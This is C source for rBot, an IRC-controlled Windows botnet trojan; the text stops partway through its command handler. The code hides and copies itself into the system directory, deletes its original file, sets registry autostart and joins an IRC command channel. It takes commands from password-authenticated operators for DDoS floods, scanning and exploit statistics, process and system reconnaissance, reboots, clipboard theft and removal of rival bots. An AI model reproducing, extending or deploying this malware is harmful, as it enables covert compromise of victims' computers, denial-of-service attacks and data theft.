/* 

  rBot

*/

#include "includes.h"
#include "functions.h"
#include "configs.h"
#include "globals.h"
#include "externs.h"

#pragma warning(disable : 4018)
#pragma comment(lib, "ws2_32")


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	char logbuf[LOGLINE],fname[_MAX_FNAME],ext[_MAX_EXT],rfilename[MAX_PATH],cfilename[MAX_PATH],sysdir[MAX_PATH];

	int i = 0, err = 0;
	DWORD id=0;
	BOOL bkpserver = FALSE;
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	#ifndef NO_EHANDLER
	// install exception handler
	DWORD handler = (DWORD)_except_handler;
    _asm
    {                           // Build EXCEPTION_REGISTRATION record:
        push    handler         // Address of handler function
        push    FS:[0]          // Address of previous handler
        mov     FS:[0],ESP      // Install new EXECEPTION_REGISTRATION
    }
	#endif

	//Sleep(15000);
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	// record start time
	started = GetTickCount() / 1000;
	// re-seed random numbers
	srand(GetTickCount());
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	#ifdef DEBUG_LOGGING
	opendebuglog();
	#endif
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	LoadDLLs(); // load all the dlls and functions here
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        // hide system messages if bot crashes
	fSetErrorMode(SEM_NOGPFAULTERRORBOX);
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	// check if this exe is running already
	if (WaitForSingleObject(CreateMutex(NULL, FALSE, botid), 30000) == WAIT_TIMEOUT)
		ExitProcess(EXIT_FAILURE);

	WSADATA WSAdata;
	if ((err = fWSAStartup(MAKEWORD(2, 2), &WSAdata)) != 0) 
		return 0;
	if (LOBYTE(WSAdata.wVersion) != 2 || HIBYTE(WSAdata.wVersion) != 2 ) {
		fWSACleanup();
		return 0;
	}

	GetSystemDirectory(sysdir, sizeof(sysdir));
	GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));
	_splitpath(cfilename, NULL, NULL, fname, ext);
	_snprintf(rfilename, sizeof(rfilename), "%s%s", fname, ext);

	if (strstr(cfilename, sysdir) == NULL) {
		char tmpfilename[MAX_PATH];
		if (rndfilename) {
			for (i=0;(unsigned int)i < (strlen(filename) - 4);i++)
				filename[i] = (char)((rand() % 26) + 97);
		}
		sprintf(tmpfilename, "%s\\%s", sysdir, filename);

		if (GetFileAttributes(tmpfilename) != INVALID_FILE_ATTRIBUTES)
			SetFileAttributes(tmpfilename,FILE_ATTRIBUTE_NORMAL);
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

		// loop only once to make sure the file is copied.
		BOOL bFileCheck=FALSE;
		while (CopyFile(cfilename, tmpfilename, FALSE) == FALSE) {
			DWORD result = GetLastError();

			if (!bFileCheck && (result == ERROR_SHARING_VIOLATION || result == ERROR_ACCESS_DENIED)) {
				bFileCheck=TRUE; // check to see if its already running! then try 1 last time.
				Sleep(15000);
			} else
				break; // just continue, it's not worth retrying.
		}

		SetFileTime(tmpfilename);
		SetFileAttributes(tmpfilename,FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);

		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		memset(&pinfo, 0, sizeof(pinfo));
		memset(&sinfo, 0, sizeof(sinfo));
		sinfo.lpTitle     = "";
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESHOWWINDOW;
		#ifdef DEBUG_CONSOLE
		sinfo.wShowWindow = SW_SHOW;
		#else
		sinfo.wShowWindow = SW_HIDE;
		#endif
		
		char cmdline[MAX_PATH];
		HANDLE hProcessOrig = OpenProcess(SYNCHRONIZE, TRUE, GetCurrentProcessId());
		sprintf(cmdline,"%s %d \"%s\"",tmpfilename, hProcessOrig, cfilename);

		if (CreateProcess(tmpfilename, cmdline, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, sysdir, &sinfo, &pinfo)) {
			Sleep(200);
			CloseHandle(pinfo.hProcess);
			CloseHandle(pinfo.hThread);
			fWSACleanup();
			ExitProcess(EXIT_SUCCESS);
		}
	}

	#ifdef DEBUG_CONSOLE
	OpenConsole();
	printf("Debugging console enabled.\n\n");
	#endif

	#ifndef NO_MELT
	// now delete it
	if (__argc > 2) {
		// now the clone is running --> kill original exe
		HANDLE hProcessOrig = (HANDLE) atoi(__argv[1]);
		WaitForSingleObject(hProcessOrig, INFINITE);
		CloseHandle(hProcessOrig);

		if (__argv[2]) {
			Sleep(2000); //wait for 2 sec to make sure process has fully exited 
			DeleteFile(__argv[2]);
		}
	}
	#endif

	if ((AutoStart) && !(noadvapi32)) 
		AutoStartRegs(rfilename);

	sprintf(logbuf,"[MAIN]: Bot started.");
	addthread(logbuf,MAIN_THREAD,NULL);
	// // // // // // // // // // // // // // // // addlog(logbuf);


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    #ifndef NO_REGISTRY
	sprintf(logbuf,"[SECURE]: Registry monitor active.");
	i=addthread(logbuf,KILLER_THREAD,NULL);
	if ((threads[i].tHandle = CreateThread(NULL, 0, &AutoRegistry, (LPVOID)&rfilename, 0, &id)) == NULL)
		sprintf(logbuf,"[SECURE]: Failed to start registry thread, error: <%d>.", GetLastError());
	// // // // // // // // // // // // // // // // addlog(logbuf);
    #endif
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	#ifndef NO_IDENT
	if (findthreadid(IDENT_THREAD) == 0) {
		sprintf(logbuf,"[IDENTD]: Server running on Port: 113."); 
		i = addthread(logbuf,IDENT_THREAD,NULL);
		if ((threads[i].tHandle = CreateThread(NULL, 0, &IdentThread, (LPVOID)i, 0, &id)) == NULL)
			sprintf(logbuf,"[IDENTD]: Failed to start server, error: <%d>.", GetLastError()); 
		// // // // // // // // // // // // // // // // addlog(logbuf);
	}
	#endif
///////////////////////////////////////////////////////////////////////////////////

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	// set version while bot is running
    current_version=rand()%(sizeof(versionlist)/sizeof(*versionlist)); // fixed

	// copy settings into main irc structure
	strncpy(mainirc.host, server, sizeof(mainirc.host)-1);
	mainirc.port = port;
	strncpy(mainirc.channel, channel, sizeof(mainirc.channel)-1);
	strncpy(mainirc.chanpass, chanpass, sizeof(mainirc.chanpass)-1);
	mainirc.spy = 0;

	while (1) {
		for (i = 0; i < 6; i++) {
			#ifndef NO_CONNCHECK
			DWORD cstat;
			// check if we're connected to the internet... if not, then wait 5mins and try again
			if (!nowininet) if (fInternetGetConnectedState(&cstat, 0) == FALSE) {
				Sleep(30000);
				continue;
			}
			#endif

			success = FALSE;
			if ((err = irc_connect((LPVOID)&mainirc)) == 2) 
				break; // break out of the loop

			if (success) i--; // if we're successful in connecting, decrease i by 1;

			// irc_connect didn't return 2, so we need to sleep then reconnect
			Sleep(3000);
		}

		if (err == 2) break; // break out of the loop and close

		if (bkpserver) {
			strncpy(mainirc.host, server, sizeof(mainirc.host)-1);
			mainirc.port = port;
			strncpy(mainirc.channel, channel, sizeof(mainirc.channel)-1);
			strncpy(mainirc.chanpass, chanpass, sizeof(mainirc.chanpass)-1);
			bkpserver = FALSE;
		}
		else if (!bkpserver && server2[0] != '\0') {
		    strncpy(mainirc.host, server2, sizeof(mainirc.host)-1);
			mainirc.port = port2;
			strncpy(mainirc.channel, channel2, sizeof(mainirc.channel)-1);
			strncpy(mainirc.chanpass, chanpass2, sizeof(mainirc.chanpass)-1);
			bkpserver = TRUE;
		}
	}

	// cleanup;
	killthreadall();
	fWSACleanup();

	return 0;
}

// connect function used by the original bot and all clones/spies
DWORD WINAPI irc_connect(LPVOID param)
{
	SOCKET sock;
	SOCKADDR_IN ssin;

	char *nick1, nickbuf[MAXNICKLEN];

	int rval;

	IRC irc = *((IRC *)param);
	IRC *ircs = (IRC *)param;
	ircs->gotinfo = TRUE;

	while (1) {
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = fhtons((unsigned int)irc.port);
		if ((ssin.sin_addr.s_addr=ResolveAddress(irc.host)) == 0) 
			return 0;

		memset(nickbuf, 0, sizeof(nickbuf));
		nick1 = rndnick(nickbuf, nicktype, nickprefix);
		strncpy(threads[irc.threadnum].nick, nick1, sizeof(threads[irc.threadnum].nick)-1);

		sock = fsocket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		threads[irc.threadnum].sock = sock;
		if (fconnect(sock, (LPSOCKADDR)&ssin, sizeof(ssin)) == SOCKET_ERROR) {
			fclosesocket(sock);
			Sleep(2000);
			continue;
		}

		#ifdef DEBUG_CONSOLE
		printf("Bot started and connect to %s.\n", irc.host);
		#endif

		rval = irc_receiveloop(sock, irc.channel, irc.chanpass, nick1, irc.sock, irc.hchan, irc.host, irc.spy);
		fclosesocket(sock);

		if (rval == 0) 
			continue;
		else if (rval == 1) {	//Disconnect (sleep 15 mins, reconnect..)
			Sleep(900000);
			continue;
		}
		else if (rval == 2) 
			break;	//Quit
	}
	clearthread(irc.threadnum);

	return rval;
}

// receive loop for bots/spies

int irc_receiveloop(SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server, int spy)
{
	// main receive buffer
	char buffer[4096], masters[MAXLOGINS][128], *lines[MAX_LINES], str[18], login[128], host[160];
	int i, j, repeat, in_channel=0;

	for (i = 0; i < MAXLOGINS; i++)
		masters[i][0] = '\0';

	if (serverpass[0] != '\0')
		irc_sendv(sock,"PASS %s\r\n",serverpass);

 	sprintf(login, "NICK %s\r\n"
				   "USER %s 0 0 :%s\r\n", nick1, rndnick(str,LETTERNICK, FALSE), nick1);

	#ifdef DEBUG_LOGGING
	debuglog(login,FALSE);
	#endif

	if (fsend(sock, login, strlen(login), 0) == SOCKET_ERROR) {
		fclosesocket(sock);
		Sleep(5000);
		return 0;
	}

	// loop forever
	while(1) {
		memset(buffer, 0, sizeof(buffer));
		// if recv() returns 0, that means that the connection has been lost.
		if (frecv(sock, buffer, sizeof(buffer), 0) <= 0) 
			break;

		// FIX ME: Truncation occurs here
		// split lines up if multiple lines received at once, and parse each line		
		i = Split(buffer,&lines);
		for (j=0;j < i;j++) {
			repeat=1;
			do {
				#ifdef DEBUG_LOGGING
				debuglog(lines[j]);
				#endif

				repeat = irc_parseline(lines[j], sock, channel, chanpass, nick1, server, masters, host, &in_channel, repeat, spy);
				repeat--;

				if (repeat > 0)
					Sleep(FLOOD_DELAY);
			} while (repeat > 0);

			switch (repeat) {
			case -1:
				return 0; // Reconnect
			case -2:
				return 1; // Disconnect
			case -3:
				return 2; // Quit
			default:
				break;
			}
		}
	}

	return 0;
}


// function to parse lines for the bot and clones
int irc_parseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, char *server, char masters[][128], char *host, int *in_channel, int repeat, int spy)
{
	char line1[IRCLINE], line2[IRCLINE], sendbuf[IRCLINE];
	char *a[MAXTOKENS], a0[128], nick[MAXNICKLEN], user[24];
	unsigned char parameters[256];

	int i, /*ii,*/ s=3;
	DWORD id=0;
	BOOL ismaster = FALSE, silent = FALSE, notice = FALSE, usevars = FALSE;
    
	memset(sendbuf, 0, sizeof(sendbuf));

	strncpy(nick, nick1, sizeof(nick)-1);

	if (line == NULL) return 1;
	memset(line1, 0, sizeof(line1));
	strncpy(line1, line, sizeof(line1)-1);
	char *x = strstr(line1, " :");

	// split the line up into seperate words
	strncpy(line2, line1, sizeof(line2)-1);
	a[0] = strtok(line2, " ");
	for (i = 1; i < MAXTOKENS; i++) 
		a[i] = strtok(NULL, " ");

	if (a[0] == NULL || a[1] == NULL) 
		return 1;

	memset(parameters,0,sizeof(parameters));
	for (i=31;i>=0;i--) {
		if (!a[i]) 
			continue;
		if ((a[i][0]=='-') && (a[i][2]==0)) {
			//Looks like a valid parameter..
			parameters[a[i][1]]=1;
			a[i][0]=0;
			a[i][1]=0;
			a[i][2]=0;
			a[i]=NULL;
		} else 
			break;
	}

	if (parameters['s']) 
		silent=TRUE;
	if (parameters['n']) {
		silent=FALSE;
		notice=TRUE;
	}

	if (a[0][0] != '\n') {
		strncpy(a0,  a[0], sizeof(a0)-1);
		strncpy(user, a[0]+1, sizeof(user)-1);
		strtok(user, "!");
	}

	// pong if we get a ping request from the server
	if (strcmp("PING", a[0]) == 0) {
		a[0][1]='O';

		//irc_sendv(sock, "PONG %s\r\n", a[1]+1);
		irc_sendv(sock, "PONG %s\r\n", a[1]);
		if (*in_channel == 0)
			irc_sendv(sock, "JOIN %s %s\r\n", channel, chanpass);  

		return 1;
	}

	// looks like we're connected to the server, let's join the channel
	if (strcmp("001", a[1]) == 0 || strcmp("005", a[1]) == 0) {
		irc_sendv(sock, "USERH4ST %s\r\n", nick1); 
		#ifndef NO_MODEONCONN
		irc_sendv(sock, "MODE %s %s\r\n", nick1, modeonconn);
		#else
		irc_sendv(sock, "MODE %s +i\r\n", nick1);
		#endif
		irc_sendv(sock, "JOIN %s %s\r\n", channel, chanpass);
		success = TRUE;
		return 1;
	}

	// get host
	if (strcmp("302", a[1]) == 0) {
		char *h = strstr(a[3], "@");
		if (h != NULL) 
			strncpy(host,  h+1, 159);
		return 1;
	}

// nick already in use   
	if (strcmp("433", a[1]) == 0) {
		rndnick(nick1, nicktype, nickprefix);
		irc_sendv(sock, "NICK %s\r\n", nick1);
		return 1;
	}

	// check if user is logged in
	for (i = 0; i < MAXLOGINS; i++) {
		if (strcmp(masters[i], a0) == 0)
			ismaster = TRUE;
	}

	//rejoin channel if we're kicked, otherwise reset master if it was our master that got kicked
	if (strcmp("KICK", a[1]) == 0) {
		char *knick;
		for (i = 0; i < MAXLOGINS; i++) {
			if (masters[i][0] == '\0') continue;
			strncpy(a0,  masters[i], sizeof(a0)-1);
			knick = user;
			if (knick != NULL && a[3] != NULL) 
				if (strcmp(knick, a[3]) == 0) {
					masters[i][0] = '\0';
					sprintf(sendbuf,"[MAIN]: User %s logged out.", knick);
					irc_sendv(sock, "NOTICE %s :%s\r\n", knick, sendbuf);
				
				}
		}
		if (strcmp(nick1, a[3]) == 0) {
			*in_channel = 0;
			irc_sendv(sock, "JOIN %s %s\r\n", channel, chanpass);
		}
		return 1;
	}

	if (strcmp("NICK", a[1]) == 0) {
		char *oldnck = user, *newnck = a[2] + 1;
		for (i=0;i<MAXLOGINS;i++) {
			if (strcmp(masters[i],a0) == 0) {
				//Master has changed nick
				//Lets TRY to rebuild the master-usermask.
				char *identandhost=strchr(a0,'!');
				if (identandhost) {
					masters[i][0]=':';	//Prefix
					strcpy(&masters[i][1],newnck);
					strcat(&masters[i][2],identandhost);
				}
			}
		}
		if(oldnck != NULL && newnck != NULL) {
			if(strcmp(oldnck, nick1) == 0) {
				strncpy(nick1, newnck, 15);
				return 1;
			}
			char debugbuf[100];
			for (i = 0; i < MAXLOGINS; i++) {
				if(masters[i][0] != '\0' && strcmp(masters[i], a0) == 0) {
					char *ih = strchr(a0, '!');
					if(ih == NULL || strlen(newnck) + strlen(ih) > 126) 
						return 1;
					sprintf(masters[i], ":%s%s", newnck, ih);
					irc_privmsg(sock, channel, debugbuf, FALSE);
					break;
				}
			}
		}

		return 1;
	}

	// reset master if master parts or quits
	if (strcmp("PART", a[1]) == 0 || strcmp("QUIT", a[1]) == 0) {
		for (i = 0; i < MAXLOGINS; i++) {
			if (masters[i][0] != '\0') {
				if (strcmp(masters[i], a[0]) == 0) {
					masters[i][0] = '\0';
					sprintf(sendbuf, "[MAIN]: User: %s logged out.", user);
					
					if (strcmp("PART", a[1]) == 0) 
						irc_sendv(sock, "NOTICE %s :%s\r\n", a[0] + 1, sendbuf);
					return 1;
				}
			}
		}
	}

	// we've successfully joined the channel
	if (strcmp("353", a[1]) == 0) {
		if (strcmp(channel, a[4]) == 0) 
			*in_channel = 1;
//		//addlogv("[MAIN]: Joined channel: %s.", a[4]);
		return 1;
	}

	// if we get a privmsg, notice or topic command, start parsing it
	if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0 || (strcmp("332", a[1]) == 0 && topiccmd)) {
		if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0) {	// it's a privmsg/notice
			if (strcmp("NOTICE", a[1]) == 0) 
				notice = TRUE;
			if (a[2] == NULL) return 1;
	
			if (strstr(a[2], "#") == NULL || notice) 
				a[2] = user;

			if (a[3] == NULL) return 1;
			a[3]++;
			// if our nick is the first part of the privmsg, then we should look at a[4] for a command, a[3] otherwise.
			if (a[3] && nick1)
				if (strncmp(nick, a[3], strlen(nick)) == 0) 
					s = 4; 
				else 
					s = 3;
			if (a[s] == NULL) return 1;
			// if someone asks for our version, send version reply
			// new version code that doesn't crash bot
			if (strcmp("\1VERSION\1", a[s]) == 0)
							if (a[2][0] != '#' && versionlist[current_version][0] != '\0') {
								irc_sendv(sock, "NOTICE %s :\1VERSION %s\1\r\n", a[2], (char *)versionlist[current_version]);

								sprintf(sendbuf, "That bitch %s has just versioned me.", user);//->
								// // // // // // // // // // // // // // // // addlog(sendbuf);

								if (!ismaster)
									irc_privmsg(sock, mainirc.channel, sendbuf, true);

								return 1;
				}
			else if (strcmp("\1PING", a[s]) == 0) 
				if (a[s+1] != NULL && a[2][0] != '#') {
					irc_sendv(sock, "NOTICE %s :\1PING %s\1\r\n", a[2], a[s+1]);
					return 1;
				}
		} else  { // it's a topic command
			s = 4;
			a[4]++;
			a[2] = a[3];
		}


		if (a[s]++[0] != prefix) 
			return 1;

	

		// see if someone is logging in
		if (strcmp("login", a[s]) == 0 || strcmp("l", a[s]) == 0) {
			if (a[s+1] == NULL || ismaster) 
				return 1;

			char *u = strtok(a[0], "!") + 1, *h = strtok(NULL, "\0");
			h = strtok(h, "~");
		
			if (strcmp(password, a[s+1]) != 0) {
				irc_sendv(sock, "NOTICE %s :Pass auth failed (%s!%s).\r\n", user, user, h);
				irc_sendv(sock, "NOTICE %s :Your attempt has been logged.\r\n", user);
				sprintf(sendbuf, "[MAIN]: *Failed pass auth by: (%s!%s).", u, h);
				// // // // // // // // // // // // // // // // addlog(sendbuf);
				return 1; 
			}
	
			BOOL host_ok=FALSE;
			for (i=0;i<(sizeof((char *)authost) / sizeof(LPTSTR));i++) {
				if (strcmp(h, authost[i]) == 0) {
					host_ok = TRUE;
					break;
				}
			}//retry
 			if (!host_ok) {
 				irc_sendv(sock, "NOTICE %s :Host Auth failed (%s!%s).\r\n", user, user, h);
 				irc_sendv(sock, "NOTICE %s :Your attempt has been logged.\r\n", user);
 				sprintf(sendbuf, "[MAIN]: *Failed host auth by: (%s!%s).", u, h);
 				// // // // // // // // // // // // // // // // addlog(sendbuf);
 				return 1;
			}
			for (i = 0; i < MAXLOGINS; i++) {
				if (a[s+1] == NULL) return 1;
				if (masters[i][0] != '\0') continue;
				if (strcmp(password, a[s+1]) == 0) {
					strncpy(masters[i],  a0, 127);
					if (!silent) irc_privmsg(sock, a[2], "[MAIN]: Password accepted.", notice);
//					//addlogv("[MAIN]: User: %s logged in.", user);
					break;
				}
			}
			return 1;
		}

		if ((ismaster || strcmp("332", a[1]) == 0) && spy == 0) {


			if (strcmp("rndnick", a[s]) == 0 || strcmp("rn", a[s]) == 0) {
				rndnick(nick, nicktype, ((parameters['p'])?(TRUE):(FALSE)), a[s+1]);
				irc_sendv(sock, "NICK %s\r\n", nick);

//				//addlogv("[MAIN]: Random nick change: %s",nick);

				return repeat;
			}
			else if (strcmp("die", a[s]) == 0 || strcmp("d", a[s]) == 0) {
				if (strcmp("332", a[1]) != 0) {
					#ifdef DEBUG_LOGGING
					closedebuglog();
					#endif
					killthreadall();
					ExitProcess(EXIT_SUCCESS);
				}
			}
			else if (strcmp("logout", a[s]) == 0 || strcmp("lo", a[s]) == 0) {
				if (a[s+1]) {
					i = atoi(a[s+1]);
					if(i >= 0 && i < MAXLOGINS) {
    					if(masters[i][0] != '\0') {
        					sprintf(sendbuf, "[MAIN]: User %s logged out.", masters[i]+1);
        					masters[i][0] = '\0';
        				} else
        					sprintf(sendbuf, "[MAIN]: No user logged in at slot: %d.", i);
					} else
						sprintf(sendbuf, "[MAIN]: Invalid login slot number: %d.", i);				
				} else {
					for (i = 0; i < MAXLOGINS; i++) 
						if (strcmp(masters[i], a[0]) == 0) {
							masters[i][0] = '\0';
							sprintf(sendbuf, "[MAIN]: User %s logged out.", user);
							break;
						}
				}
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				// // // // // // // // // // // // // // // // addlog(sendbuf);

				return 1;
			}
			#ifndef NO_BOTVERSION
			else if (strcmp("version", a[s]) == 0 || strcmp("ver", a[s]) == 0) {
				sprintf(sendbuf, "[MAIN]: %s", version);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				// // // // // // // // // // // // // // // // addlog(sendbuf);

				return repeat;
			}
			#endif
#ifndef NO_BOTKILLER
else if (strcmp("botcheck", a[s]) == 0) {
				SBotKiller BK;
				BK.ChanSock = sock;
				if(silent) BK.Silent = TRUE;
				else BK.Silent = FALSE;
				strcpy(BK.Channel, a[2]);
				BK.notice = notice;

				CreateThread(NULL, 0, &botkiller_main, (LPVOID)&BK, 0, &id);
			}
#endif
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
			else if (strcmp("httpstop",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"[HTTPD]","Server",HTTP_THREAD,a[s+1]);

				return 1;
			}
			else if (strcmp("logstop",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"[LOG]","Log list",LOG_THREAD,a[s+1]);

				return 1;
			}

			else if (strcmp("ddos.stop",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"[DDoS]","DDoS flood",DDOS_THREAD,a[s+1]);

				return 1;
			}


	
			#ifndef NO_PROCESS
			else if (strcmp("procsstop",a[s]) == 0 || strcmp("psstop",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"[PROC]","Process list",PROC_THREAD,a[s+1]);

				return 1;
			}
			#endif
		

			else if (strcmp("scanstop",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"[SCAN]","Scan",SCAN_THREAD,a[s+1]);

				return 1;
			}

			else if (strcmp("scanstats",a[s]) == 0 || strcmp("stats",a[s]) == 0) {
				ListExploitStats(sock,a[2],notice);

				return repeat;
			}
			else if (strcmp("reconnect", a[s]) == 0 || strcmp("r", a[s]) == 0) {
				irc_sendv(sock, "QUIT :reconnecting\r\n");
				// // // // // // // // // // // // // // // // // addlog("[MAIN]: Reconnecting.");

				return 0;
			}
			else if (strcmp("disconnect", a[s]) == 0 || strcmp("dc", a[s]) == 0) {
				irc_sendv(sock, "QUIT :disconnecting\r\n");
				// // // // // // // // // // // // // // // // // addlog("[MAIN]: Disconnecting.");

				return -1;
			}
			else if (strcmp("quit", a[s]) == 0 || strcmp("q", a[s]) == 0) {
				if (a[s+1]) {
					if (x != NULL) {
						char *y = strstr(x, a[s+1]);
						if (y != NULL) irc_sendv(sock, "QUIT :%s\r\n", y);
					}
				} else 
					irc_sendv(sock, "QUIT :later\r\n"); 

				return -2;
			}
			else if (strcmp("status", a[s]) == 0 || strcmp("s", a[s]) == 0) {
				sprintf(sendbuf, "[MAIN]: Status: Ready. Bot Uptime: %s.", Uptime(started));
				irc_privmsg(sock, a[2], sendbuf, notice);
				// // // // // // // // // // // // // // // // // addlog(sendbuf);

				return repeat;
			}
			else if (strcmp("id", a[s]) == 0 || strcmp("i", a[s]) == 0) {
				sprintf(sendbuf, "[MAIN]: Bot ID: %s.", botid);
				irc_privmsg(sock, a[2], sendbuf, notice);
				// // // // // // // // // // // // // // // // // addlog(sendbuf);

				return repeat;
			}
			else if (strcmp("reboot", a[s]) == 0) {
				sprintf(sendbuf, ((Reboot())?("[MAIN]: Rebooting system."):("[MAIN]: Failed to reboot system.")));
				irc_privmsg(sock, a[2], sendbuf, notice);
				// // // // // // // // // // // // // // // // // addlog(sendbuf);

				return 1;
			}
			else if (strcmp("threads", a[s]) == 0 || strcmp("t", a[s]) == 0) {
				TLIST tlist;
				_snprintf(tlist.chan, sizeof(tlist.chan), a[2]);
				tlist.sock = sock;
				tlist.notice = notice;
				tlist.silent = silent;
				tlist.full = ((a[s+1])?((strcmp(a[s+1],"sub") == 0)?(TRUE):(FALSE)):(FALSE));

				sprintf(sendbuf, "[THREADS]: List threads.");
				tlist.threadnum = addthread(sendbuf, LIST_THREAD, NULL);
				if (threads[tlist.threadnum].tHandle = CreateThread(NULL, 0, &ListThread, (LPVOID)&tlist, 0, &id)) {
					while (tlist.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"[THREADS]: Failed to start list thread, error: <%d>.", GetLastError());
				// // // // // // // // // // // // // // // // // addlog(sendbuf);
	
				return repeat;
			}
		

			#ifndef NO_NETINFO
			else if (strcmp("netinfo", a[s]) == 0 || strcmp("ni", a[s]) == 0) {
				irc_privmsg(sock, a[2], netinfo(sendbuf, host, sock), notice);
				// // // // // // // // // // // // // // // // // addlog("[MAIN]: Network Info.");

				return repeat;
			}
			#endif
			#ifndef NO_SYSINFO
			else if (strcmp("sysinfo", a[s]) == 0 || strcmp("si", a[s]) == 0) {
				irc_privmsg(sock, a[2], sysinfo(sendbuf, sock), notice);
				// // // // // // // // // // // // // // // // addlog("[MAIN]: System Info.");

				return repeat;
			}
			#endif
			else if (strcmp("remove", a[s]) == 0 || strcmp("rm", a[s]) == 0) {
				if (!silent) irc_privmsg(sock, a[2], "[MAIN]: Removing Bot.", notice);
				#ifdef DEBUG_LOGGING
				closedebuglog();
				#endif
				fclosesocket(sock);
				fWSACleanup();
				uninstall();
				ExitProcess(EXIT_SUCCESS);
			}
			#ifndef NO_PROCESS
			else if (strcmp("procs", a[s]) == 0 || strcmp("ps", a[s]) == 0) {
				if (findthreadid(PROC_THREAD) > 0) {
					if (!silent) irc_privmsg(sock, a[2], "[PROC]: Already running.", notice);
				} else {
					LPROC lproc;
					_snprintf(lproc.chan, sizeof(lproc.chan), a[2]);
					lproc.sock = sock;
					lproc.notice = notice;
					lproc.silent = silent;
					lproc.full = FALSE;
					if (a[s+1])
						if (strcmp("full", a[s+1]) == 0)
							lproc.full = TRUE;

					sprintf(sendbuf,"[PROCS]: Proccess list.");
					lproc.threadnum = addthread(sendbuf, PROC_THREAD, NULL);
					if (threads[lproc.threadnum].tHandle = CreateThread(NULL, 0, &listProcessesThread, (LPVOID)&lproc, 0, &id)) {
						while (lproc.gotinfo == FALSE)
							Sleep(50);
					} else
						sprintf(sendbuf,"[PROCS]: Failed to start listing thread, error: <%d>.", GetLastError());
					// // // // // // // // // // // // // // // // addlog(sendbuf);
				}

				return 1;
			}
			#endif

			else if (strcmp("uptime", a[s]) == 0 || strcmp("up", a[s]) == 0) {
				DWORD uptime = -1, total = GetTickCount() / 1000;

				if(a[s+1])
					uptime = atoi(a[s+1]); 
			   
				if (total/86400 >= uptime || uptime == -1) { 
					sprintf(sendbuf, "[MAIN]: Uptime: %s.", Uptime());
					irc_privmsg(sock, a[2], sendbuf, notice);
					// // // // // // // // // // // // // // // // addlog(sendbuf);
				} 

				return repeat;
			}
			else if (strcmp("driveinfo", a[s]) == 0 || strcmp("drv", a[s]) == 0) {
				DriveInfo(sock, a[2], notice, a[s+1]);

				return 1;
			}
			else if (strcmp("testdlls", a[s]) == 0 || strcmp("dll", a[s]) == 0) {
				CheckDLLs(sock,a[2],notice,silent);

				return 1;
			}


			else if (strcmp("who", a[s]) == 0) {
				if (!silent) irc_privmsg(sock, a[2], "-[Login List]-", notice);
				for (i = 0; i < MAXLOGINS; i++) {
					sprintf(sendbuf,"%d. %s",i,((masters[i][0] != '\0')?(masters[i]+1):("<Empty>")));
    				irc_privmsg(sock, a[2], sendbuf, notice, TRUE);
				}
				// // // // // // // // // // // // // // // // addlog("[MAIN]: Login list complete.");
			}
			else if (strcmp("getclip", a[s]) == 0 || strcmp("gc", a[s]) == 0) {
				if (!silent) irc_privmsg(sock, a[2], "-[Clipboard Data]-", notice);
